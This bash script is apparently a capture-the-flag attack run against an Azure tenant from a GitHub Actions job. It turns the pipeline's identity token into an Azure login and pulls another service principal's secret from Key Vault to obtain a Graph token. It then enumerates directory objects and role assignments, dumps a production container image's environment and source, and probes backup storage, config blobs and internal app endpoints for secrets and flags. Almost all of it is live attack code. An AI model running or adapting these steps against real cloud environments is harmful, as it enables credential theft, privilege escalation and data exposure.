#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
RG="rg-tbl-platform-prod-sea"
ACR="crtblplatprodx3euoz.azurecr.io"
IMG="$ACR/tebamoto-reporting-api:latest"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
VTOK=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)

echo "=== DIRECTORY-AUDIT GRAPH: LOOKUP d2cdf247 ==="
DA_CID="2c34300e-1bc0-41e7-9c1e-8b7571d72c72"
DA_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)

GT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "Graph token len=${#GT}"

echo "d2cdf247 lookup:"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/d2cdf247-9319-40cb-8324-5a005ef538da" \
  -H "Authorization: Bearer $GT" | head -c 800
echo ""

echo "43834909 lookup:"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/43834909-47cf-4a4a-8048-e323b4897ed3" \
  -H "Authorization: Bearer $GT" | head -c 800
echo ""

echo "eeab432e (storefront sami) lookup:"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/eeab432e-1bf6-400e-b155-a28ce7cafcdb" \
  -H "Authorization: Bearer $GT" | head -c 600
echo ""

echo "f64d08c7 (reporting uami) lookup:"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/f64d08c7-fde6-4553-99c8-5bf73666ee8c" \
  -H "Authorization: Bearer $GT" | head -c 600
echo ""

echo "=== SUBSCRIPTION-LEVEL ROLE ASSIGNMENTS FOR STOREFRONT SAMI ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'eeab432e-1bf6-400e-b155-a28ce7cafcdb'" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
print("storefront SAMI assignments:", len(vals))
for r in vals:
    print("  scope="+r["properties"]["scope"]+" role="+r["properties"]["roleDefinitionId"].split("/")[-1])
' 2>/dev/null

echo "=== PULL AND INSPECT DOCKER IMAGE ==="
az acr login -n crtblplatprodx3euoz 2>&1 | head -2
docker pull "$IMG" 2>&1 | tail -5

echo "--- Image ENV vars ---"
docker inspect "$IMG" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null

echo "--- Image CMD/Entrypoint ---"
docker inspect "$IMG" --format 'CMD:{{.Config.Cmd}} ENTRYPOINT:{{.Config.Entrypoint}}' 2>/dev/null

echo "--- Image Labels ---"
docker inspect "$IMG" --format '{{json .Config.Labels}}' 2>/dev/null

echo "--- Image History (layers) ---"
docker history "$IMG" 2>/dev/null | head -30

echo "--- Scan for flag in image filesystem ---"
docker run --rm --entrypoint="" "$IMG" sh -c '
find / -name "*.py" -o -name "*.json" -o -name "*.env" -o -name "*.txt" -o -name ".flag*" 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | head -50
echo "---ENV---"
env
echo "---ID---"
id
echo "---HOSTNAME---"
hostname
' 2>/dev/null | head -100

echo "--- Grep for DF26 in image ---"
docker run --rm --entrypoint="" "$IMG" sh -c 'grep -r "DF26" / 2>/dev/null | head -10' 2>/dev/null

echo "--- Read app.py or main.py from image ---"
docker run --rm --entrypoint="" "$IMG" sh -c '
for f in /app/app.py /app/main.py /app/server.py /src/app.py /app/run.py; do
  [ -f "$f" ] && echo "==$f==" && head -100 "$f"
done
find /app /src / -name "*.py" 2>/dev/null | head -20 | xargs head -30 2>/dev/null
' 2>/dev/null | head -200

echo "=== BACKUP STORAGE - ENUMERATE EXPORTS CONTAINER ==="
BACKUP_SA="sttblbackupprodx3euoz"
# Try using cicd-deployer ARM token to list blobs (this will fail, but try)
curl -sS "https://${BACKUP_SA}.blob.core.windows.net/exports?restype=container&comp=list&include=metadata" \
  -H "Authorization: Bearer $ARM" -H "x-ms-version: 2021-08-06" | head -c 1000

echo ""
echo "=== TRY ANONYMOUS ACCESS TO BACKUP EXPORTS CONTAINER ==="
# PublicAccess=blob means individual blobs are public, but container listing requires auth
curl -sS "https://${BACKUP_SA}.blob.core.windows.net/exports?restype=container&comp=list" \
  -H "x-ms-version: 2021-08-06" | head -c 1000

echo ""
echo "=== TRY COMMON BLOB NAMES IN EXPORTS ==="
for name in flag.json flag.txt backup.json archive.json secrets.json data.json export.json; do
  STATUS=$(curl -sS -o /dev/null -w "%{http_code}" "https://${BACKUP_SA}.blob.core.windows.net/exports/$name")
  echo "$name: $STATUS"
  if [ "$STATUS" = "200" ]; then
    curl -sS "https://${BACKUP_SA}.blob.core.windows.net/exports/$name" | head -c 500
  fi
done

echo "=== STOREFRONT INTERNAL ENDPOINTS PROBE ==="
SF_HOST="app-tbl-storefront-prod.azurewebsites.net"
SF_FDID="60407ff3-1c24-4875-9390-b6c9c13b0821"
for path in "/internal" "/internal/debug" "/api/v1/reports/render" "/flag" "/admin" "/env" "/.env" "/debug" "/config"; do
  STATUS=$(curl -sS -o /dev/null -w "%{http_code}" -H "X-Azure-FDID: $SF_FDID" "https://$SF_HOST$path")
  echo "$path: $STATUS"
done

echo "=== APPCFG INTERNAL-CONFIG.JSON ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 1000

echo "DONE"
